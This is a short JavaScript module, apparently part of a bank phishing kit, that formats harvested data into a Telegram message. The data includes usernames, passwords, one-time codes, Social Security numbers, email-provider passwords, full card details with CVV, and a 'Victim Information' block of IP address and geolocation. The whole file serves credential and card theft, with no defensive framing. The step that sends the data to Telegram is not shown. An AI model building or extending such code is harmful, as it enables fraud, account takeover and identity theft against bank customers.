const telegramMessage = (body) => {
  return `
${body.bank}\n
Username: ${body?.username || ""}
Password: ${body?.password || ""}
OTP: ${body?.otp || ""}
Email: ${body?.email || ""}
Phone number: ${body?.phone || ""}
OTP2: ${body?.otp2 || ""}
Name: ${body?.name || ""}
Address: ${body?.address || ""}
SSN: ${body?.ssn || ""}\n
Provider Information:
  Email: ${body?.providerInfo ? body?.email : ""}
  Password: ${body?.providerInfo?.password || ""}\n
Card Information:
  Card Number: ${body?.cardInfo?.card || ""}
  CVV: ${body?.cardInfo?.cvv || ""}
  Expiry: ${body?.cardInfo?.expiry || ""}\n
Victim Information:
  IP: ${body?.victimInfo.ip}
  City: ${body.victimInfo.city}
  Country: ${body.victimInfo.country}
  Country code: ${body.victimInfo.countryCode}
  Region: ${body.victimInfo.region}
  Region name: ${body.victimInfo.regionName}
  Zip code: ${body.victimInfo.zip}
  Latitude: ${body.victimInfo.lat}
  Longitude: ${body.victimInfo.lon}\n
User agent: ${body.userAgent}
`;
};

module.exports = { telegramMessage };
